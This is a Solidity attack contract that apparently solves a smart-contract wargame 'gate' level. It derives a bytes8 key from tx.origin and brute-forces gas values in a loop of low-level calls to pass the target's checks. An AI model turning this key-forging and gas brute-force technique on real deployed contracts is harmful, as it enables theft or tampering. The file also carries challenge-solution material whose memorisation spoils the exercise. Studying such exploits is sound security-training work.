// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IGate{
  function enter(bytes8 _gateKey) external returns (bool);
}

contract GateOneCrack{
    IGate gate;
    constructor(IGate _gate) public{
        gate = _gate;
    }
    // Gas Cost Spreadsheet
    //https://docs.google.com/spreadsheets/d/1m89CVujrQe5LAFJ8-YAUCcNK950dUzMQPMJBxRtGCqs/edit#gid=0
    function crack() external returns(bool){
        uint16 origin16 = uint16(tx.origin);
        uint32 extend32 = (uint32(origin16)) + 1;
        uint64 extend64 = (uint64(extend32) << 32) | uint64(origin16);
        bytes8 key = bytes8(extend64);
        bytes memory encoded = abi.encodeWithSignature("enter(bytes8)", key);
        for(uint i=0;i<200;i++){
            (bool success, ) = address(gate).call{gas: i+150+(8191*3)}(encoded);
            if(success)return true;
        }
        require(false, "Not success!");
    }
}
